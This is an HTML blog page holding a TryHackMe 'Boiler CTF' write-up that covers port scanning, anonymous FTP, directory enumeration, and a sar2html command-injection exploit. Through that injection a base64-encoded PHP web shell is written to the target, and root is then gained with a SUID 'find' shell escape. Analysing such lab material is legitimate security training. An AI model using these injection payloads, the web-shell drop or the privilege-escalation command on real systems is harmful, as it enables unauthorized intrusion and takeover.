@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  <meta name="author" content="Piotr Politowicz">
+
+
+
+
+
+<title>THM Boiler CTF writeup | Pwicz Blog</title>
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/nprogress/nprogress.css">
+
+
+
+<script src="/lib/jquery.min.js"></script>
+
+
+<script src="/lib/iconify-icon.min.js"></script>
+
+
+<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+<script>
+  tailwind.config = {
+    darkMode: "class",
+  };
+</script>
+
+
+<script src="/lib/nprogress/nprogress.js"></script>
+
+<script>
+  $(document).ready(() => {
+    NProgress.configure({
+      showSpinner: false,
+    });
+    NProgress.start();
+    $("#nprogress .bar").css({
+      background: "#FF4C29",
+    });
+    $("#nprogress .peg").css({
+      "box-shadow": "0 0 2px #FF4C29, 0 0 4px #FF4C29",
+    });
+    $("#nprogress .spinner-icon").css({
+      "border-top-color": "#FF4C29",
+      "border-left-color": "#FF4C29",
+    });
+    setTimeout(function () {
+      NProgress.done();
+      $(".fade").removeClass("out");
+    }, 800);
+  });
+</script>
+
+<script>
+  (function () {
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+    if (setting === "dark" || (prefersDark && setting !== "light"))
+      document.documentElement.classList.toggle("dark", true);
+    let isDark = document.documentElement.classList.contains("dark");
+  })();
+
+  $(document).ready(function () {
+    // init icon
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const isDark = document.documentElement.classList.contains("dark");
+    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+
+    function toggleGiscusTheme() {
+      const isDark = document.documentElement.classList.contains("dark");
+      const giscusFrame = document.querySelector("iframe.giscus-frame");
+      if (giscusFrame) {
+        giscusFrame.contentWindow.postMessage(
+          {
+            giscus: {
+              setConfig: {
+                theme: isDark ? "dark" : "light",
+              },
+            },
+          },
+          "https://giscus.app"
+        );
+      }
+    }
+
+
+    // toggle dark mode
+    function toggleDark() {
+      let isDark = document.documentElement.classList.contains("dark");
+      isDark = !isDark;
+      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+      document.documentElement.classList.toggle("dark", isDark);
+      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+      if (prefersDark === isDark) {
+        localStorage.setItem("hexo-color-scheme", "auto");
+      } else {
+        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
+      }
+      toggleGiscusTheme();
+    }
+    $("#toggle-dark").click(toggleDark);
+    // listen dark mode change
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (e) => {
+        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+        if (setting === "auto") {
+          document.documentElement.classList.toggle("dark", e.matches);
+          $("#theme-icon").attr(
+            "icon",
+            e.matches ? "ri:moon-line" : "ri:sun-line"
+          );
+          toggleGiscusTheme();
+        }
+      });
+  });
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200">
+  <header
+  class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5"
+>
+  <div class="max-auto">
+    <nav class="flex items-center text-base">
+      <a href="/" class="group">
+        <h2 class="font-medium tracking-tighterp text-l p-2">
+          <img
+            class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]"
+            style="filter: invert(49%) sepia(99%) saturate(2270%) hue-rotate(334deg) brightness(91%) contrast(126%);"
+            id="logo"
+            src="/images/fox.svg"
+            alt="Pwicz Blog"
+          />
+          Pwicz Blog
+        </h2>
+      </a>
+      <div
+        id="header-title"
+        class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis"
+      >
+        THM Boiler CTF writeup
+      </div>
+      <div class="flex-1"></div>
+      <div class="flex items-center gap-3">
+        
+        <a class="hidden sm:flex" href="/archives"
+          >Posts</a
+        >
+        
+        <a class="hidden sm:flex" href="/category"
+          >Categories</a
+        >
+        
+        <a class="hidden sm:flex" href="/tag"
+          >Tags</a
+        >
+          
+        <a
+          class="w-5 h-5 hidden sm:flex"
+          title="Github"
+          target="_blank" rel="noopener" href="https://github.com/pwicz"
+        >
+          <iconify-icon
+            width="20"
+            icon="ri:github-line"
+          ></iconify-icon>
+        </a>
+        
+        <a
+          class="w-5 h-5 hidden sm:flex"
+          title="Twitter"
+          target="_blank" rel="noopener" href="https://twitter.com/pwicz1"
+        >
+          <iconify-icon
+            width="20"
+            icon="ri:twitter-line"
+          ></iconify-icon>
+        </a>
+         
+        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
+          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
+        </a>
+      </div>
+      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
+        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
+          <iconify-icon width="20" icon="carbon:menu"></iconify-icon>
+        </span>
+        <span
+          class="w-5 h-5 hidden"
+          aria-hidden="true"
+          role="img"
+          id="close-menu"
+        >
+          <iconify-icon width="20" icon="carbon:close"></iconify-icon>
+        </span>
+      </div>
+    </nav>
+  </div>
+</header>
+<div
+  id="menu-panel"
+  class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10"
+>
+  <div
+    id="menu-content"
+    class="relative z-20 bg-white/80 dark:bg-black/5 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300"
+  >
+    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
+      
+      <li
+        class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main"
+      >
+        <a
+          href="/archives"
+          class="flex h-12 sm:h-auto items-center"
+          >Posts</a
+        >
+      </li>
+      
+      <li
+        class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main"
+      >
+        <a
+          href="/category"
+          class="flex h-12 sm:h-auto items-center"
+          >Categories</a
+        >
+      </li>
+      
+      <li
+        class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main"
+      >
+        <a
+          href="/tag"
+          class="flex h-12 sm:h-auto items-center"
+          >Tags</a
+        >
+      </li>
+      
+    </ul>
+  </div>
+  <div class="mask bg-black/20 absolute inset-0"></div>
+</div>
+
+  <main class="p-12">
+    <!-- css -->
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">
+ 
+<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">
+
+<!-- toc -->
+ <!-- tocbot -->
+<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>
+ 
+<section class="px-6 max-w-prose mx-auto md:px-0">
+  <!-- header -->
+  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
+    <div class="pt-4 md:pt-6">
+      <h1
+        id="article-title"
+        class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]"
+      >
+        THM Boiler CTF writeup
+      </h1>
+      <p class="mb-6"></p>
+      <div>
+        <section class="flex items-center gap-3 text-sm">
+          <time>2023-12-01 00:04:15</time>
+          <span class="text-gray-400">·</span>
+          <span>4 min</span>
+          <span class="text-gray-400">·</span>
+          <span>796 words</span>
+        </section>
+      </div>
+    </div>
+  </header>
+  <!-- content -->
+  <article class="post-content mt-10 prose dark:prose-invert post-content">
+    <p>Challenge link: <a target="_blank" rel="noopener" href="https://tryhackme.com/room/boilerctf2">https://tryhackme.com/room/boilerctf2</a></p>
+<h2 id="1-Reconnaissance"><a href="#1-Reconnaissance" class="headerlink" title="1. Reconnaissance"></a>1. Reconnaissance</h2><p>First things first, we perform a port scan on the target to discover potential attack vectors:<br><img src="https://i.imgur.com/mCBedq0.png"></p>
+<p>We catch the SSH service on port 55007 thanks to scanning for all possible ports. It takes more time, it is quite loud, but in this CTF setting it is totally fine.</p>
+<p>Besides that, we find FTP on port 21, a web server on port 80, and a web-based server management control panel <a target="_blank" rel="noopener" href="https://webmin.com/">Webmin</a> on port 10000.</p>
+<h2 id="2-FTP-and-Webmin"><a href="#2-FTP-and-Webmin" class="headerlink" title="2. FTP and Webmin"></a>2. FTP and Webmin</h2><p>The first thing I do when I see an FTP server is try to log in as Anonymous.</p>
+<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>It works in this case, and listing all files in the directory shows a <code>.info.txt</code> file:</p>
+<p><img src="https://i.imgur.com/LOCjPir.png"></p>
+<p>The content of the file look encrypted, but typical English structure is preserved which points to a simple substitution cipher:</p>
+<p><img src="https://i.imgur.com/VgOfRwe.png"></p>
+<p>The Caesar Cipher, perhaps? Let’s use <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">CyberChef</a> to try to decrypt the message. ROT13 mode reveals the following message:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Just wanted to see if you find it. Lol. Remember: Enumeration is the key!</span><br></pre></td></tr></table></figure>
+<p>Well, not much use of that. Let’s go to other services then.</p>
+<h3 id="Webmin"><a href="#Webmin" class="headerlink" title="Webmin"></a>Webmin</h3><p>Since we don’t even have a username to try to connect through SSH and the web server is serving a default page, I decided to look at Webmin. Checking ExploitDB for any CVEs matching <code>Webmin MiniServ 1.930</code> yields no results. I guess time to go back to the web server.</p>
+<h2 id="3-Web-server"><a href="#3-Web-server" class="headerlink" title="3. Web server"></a>3. Web server</h2><p>Not much to see here, so let us try to find anything interesting by enumerating directories with <a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">Gobuster</a> and one of the <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">SecLists</a> wordlists:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://&lt;URL&gt;/ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/a4gQgL4.png"></p>
+<p>Bingo! Joomla CMS is installed on the server. Besides it, <code>robots.txt</code> file exists which may contain some clues.</p>
+<h3 id="Robots-txt"><a href="#Robots-txt" class="headerlink" title="Robots.txt"></a>Robots.txt</h3><p>Let’s look at the robots first:</p>
+<p><img src="https://i.imgur.com/nV3zN4K.png"></p>
+<p>It looks like another rabbit hole, but perhaps the numbers at the bottom that look like decimal ASCII have any meaning:</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">079</span> <span class="number">084</span> <span class="number">108</span> <span class="number">105</span> <span class="number">077</span> <span class="number">068</span> <span class="number">089</span> <span class="number">050</span> <span class="number">077</span> <span class="number">071</span> <span class="number">078</span> <span class="number">107</span> <span class="number">079</span> <span class="number">084</span> <span class="number">086</span> <span class="number">104</span> <span class="number">090</span> <span class="number">071</span> <span class="number">086</span> <span class="number">104</span> <span class="number">077</span> <span class="number">122</span> <span class="number">073</span> <span class="number">051</span> <span class="number">089</span> <span class="number">122</span> <span class="number">085</span> <span class="number">048</span> <span class="number">077</span> <span class="number">084</span> <span class="number">103</span> <span class="number">121</span> <span class="number">089</span> <span class="number">109</span> <span class="number">070</span> <span class="number">104</span> <span class="number">078</span> <span class="number">084</span> <span class="number">069</span> <span class="number">049</span> <span class="number">079</span> <span class="number">068</span> <span class="number">081</span> <span class="number">075</span></span><br></pre></td></tr></table></figure>
+
+<p>Using CyberChef again with the recipes <code>From Decimal</code> and <code>From Base64</code>, we discover a hash-looking string:</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">99</span>b0660cd95adea327c54182baa51584</span><br></pre></td></tr></table></figure>
+<p>Indeed, <a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation</a> confirms that this is an MD5 hash. However, the hashed value is ‘kidding’. Another rabbit hole then.</p>
+<h3 id="Joomla"><a href="#Joomla" class="headerlink" title="Joomla"></a>Joomla</h3><p>The website itself doesn’t reveal anything interesting. Default and simple credentials such as <code>admin:admin</code> do not work. This Joomla also doesn’t seem vulnerable after looking for CVEs. Nothing left but to enumerate again with Gobuster.</p>
+<p>It took me quite a lot of time to go through multiple accessible directories, but finally, under the <code>_test/</code> directory, a <code>sar2html</code> is revealed:</p>
+<p><img src="https://i.imgur.com/WnX0uI3.png"></p>
+<p>Googling for more information reveals that it is most likely vulnerable to RCE. Having read the <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/49344">exploit code</a>, we can execute code by setting the <code>plot</code> parameter to <code>;&lt;command&gt;</code>. For example, accessing this URL:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//&lt;IP&gt;/joomla/_test/?plot=;whoami</span></span><br></pre></td></tr></table></figure>
+<p>prints the username as one of the options in the select HTML element:<br><img src="https://i.imgur.com/uaxtfQF.png"></p>
+<p>This confirms the RCE vulnerability. To make it easier for me, I echoed a PHP shell to a <code>shell.php</code> file using the following URL (decode the plot parameter to see the executed command):</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//&lt;IP&gt;/joomla/_test/index.php?plot=;echo%20PGh0bWw%2BDQo8Ym9keT4NCjxmb3JtIG1ldGhvZD0iR0VUIiBuYW1lPSI8P3BocCBlY2hvIGJhc2VuYW1lKCRfU0VSVkVSWydQSFBfU0VMRiddKTsgPz4iPg0KPGlucHV0IHR5cGU9IlRFWFQiIG5hbWU9ImNtZCIgaWQ9ImNtZCIgc2l6ZT0iODAiPg0KPGlucHV0IHR5cGU9IlNVQk1JVCIgdmFsdWU9IkV4ZWN1dGUiPg0KPC9mb3JtPg0KPHByZT4NCjw%2FcGhwDQogICAgaWYoaXNzZXQoJF9HRVRbJ2NtZCddKSkNCiAgICB7DQogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOw0KICAgIH0NCj8%2BDQo8L3ByZT4NCjwvYm9keT4NCjxzY3JpcHQ%2BZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNtZCIpLmZvY3VzKCk7PC9zY3JpcHQ%2BDQo8L2h0bWw%2B%20|%20base64%20-d%20%3E%20shell.php</span></span><br></pre></td></tr></table></figure>
+<p>and starting executing commands from there. I connected back to my machine with some help from <a target="_blank" rel="noopener" href="https://www.revshells.com/">revshells.com</a> (using their PHP proc_open shell) and listed files in the directory. This revealed a file called <code>log.txt</code> with this line inside:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aug 20 11:16:35 parrot sshd[2451]: Accepted password <span class="keyword">for</span> basterd from 10.1.1.1 port 49824 ssh2 <span class="comment">#pass: superduperp@$$ </span></span><br></pre></td></tr></table></figure>
+<p>Suffice to say, we get access to the victim through SSH exposed on port 55007. </p>
+<h2 id="4-Victim-machine"><a href="#4-Victim-machine" class="headerlink" title="4. Victim machine"></a>4. Victim machine</h2><p>Once on the victim machine logged in as <code>basterd</code>, their home directory contains a file called <code>backup.sh</code> with the following lines:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER=stoner</span><br><span class="line"><span class="comment">#superduperp@$$no1knows</span></span><br></pre></td></tr></table></figure>
+
+<p>Looks like we get access to yet another user. Running:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su stoner</span><br><span class="line">superduperp@$<span class="variable">$no1knows</span></span><br></pre></td></tr></table></figure>
+
+<p>changes the account to <code>stoner</code> and reveals a <code>.secret</code> file in their home directory. This is the user flag.</p>
+<h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><p>This was probably the simplest part of the challenge. Checking stoner’s SUID binaries by running:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>reveals that the <code>find</code> utility has this permission set. Confirming with <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/find/">GTFOBins</a>, it is vulnerable and can be used to run a privileged shell by running:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
+
+<p>Bingo! The last root flag is located in the <code>/root</code> home directory.</p>
+
+  </article>
+  <!-- tag -->
+  
+  <div class="mt-12 pt-6 border-t border-gray-200">
+    
+    <span
+      class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200"
+    >
+      <a href="/tags/THM/">THM</a>
+    </span>
+    
+    <span
+      class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200"
+    >
+      <a href="/tags/writeup/">writeup</a>
+    </span>
+    
+    <span
+      class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200"
+    >
+      <a href="/tags/challenge/">challenge</a>
+    </span>
+    
+  </div>
+  
+  <!-- prev and next -->
+  <div class="flex justify-between mt-6 pt-6 border-t border-gray-200">
+    <div>
+      
+    </div>
+    <div>
+      
+      <a
+        href="/2023/11/29/THM-dogcat-writeup/"
+        class="text-sm text-gray-400 hover:text-gray-500 flex justify-center"
+      >
+        THM dogcat writeup
+        <iconify-icon
+          width="20"
+          icon="ri:arrow-right-s-line"
+          data-inline="false"
+        ></iconify-icon>
+      </a>
+      
+    </div>
+  </div>
+  <!-- comment -->
+  <div class="article-comments mt-12">
+</div>
+</section>
+<!-- js inspect -->
+
+<script src="/lib/clipboard.min.js"></script>
+ 
+<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+ 
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+  $(document).ready(() => {
+    const maraidConfig = {
+      theme: "dark",
+      logLevel: 3,
+      flowchart: { curve: "linear" },
+      gantt: { axisFormat: "%m/%d/%Y" },
+      sequence: { actorMargin: 50 },
+    };
+    mermaid.initialize(maraidConfig);
+  });
+</script>
+
+ 
+<script src="/lib/fancybox/fancybox.umd.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+    $('.post-content').each(function(i){
+      $(this).find('img').each(function(){
+        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
+        var alt = this.alt;
+        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
+        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
+      });
+      $(this).find('.fancybox').each(function(){
+        $(this).attr('rel', 'article' + i);
+      });
+    });
+
+    Fancybox.bind('[data-fancybox="gallery"]', {
+        // options
+    })
+  })
+</script>
+ <!-- tocbot begin -->
+
+<script src="/lib/tocbot/tocbot.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+      tocbot.init({
+        // Where to render the table of contents.
+        tocSelector: '.post-toc',
+        // Where to grab the headings to build the table of contents.
+        contentSelector: '.post-content',
+        // Which headings to grab inside of the contentSelector element.
+        headingSelector: 'h1, h2, h3',
+        // For headings inside relative or absolute positioned containers within content.
+        hasInnerContainers: true,
+    });
+  })
+</script>
+<!-- tocbot end -->
+
+
+  </main>
+  <footer
+  class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm"
+>
+  <!-- busuanzi -->
+  <!-- 
+ -->
+  <!-- copyright -->
+  <div class="flex items-center gap-2">
+    <span>© 2023 </span>
+    <a href="https://github.com/pwicz" target="_blank" rel="noopener noreferrer"
+      >pwicz</a
+    >
+  </div>
+  <!-- powered by -->
+  <div class="flex items-center gap-2">
+    <span>Powered by</span>
+    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer"
+      >Hexo</a
+    >
+    <span>&</span>
+    <a
+      href="https://github.com/xbmlz/hexo-theme-maple"
+      target="_blank"
+      rel="noopener noreferrer"
+      >Maple</a
+    >
+  </div>
+</footer>
+
+  <iconify-icon class="fixed right-4 bottom-10 z-100 opacity-0" width="24" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
+  
+<script src="/js/main.js"></script>
+ 
+
+
+  <div class="w-screen h-screen -z-999" id="maple"></div>
+</body>
+
+</html>
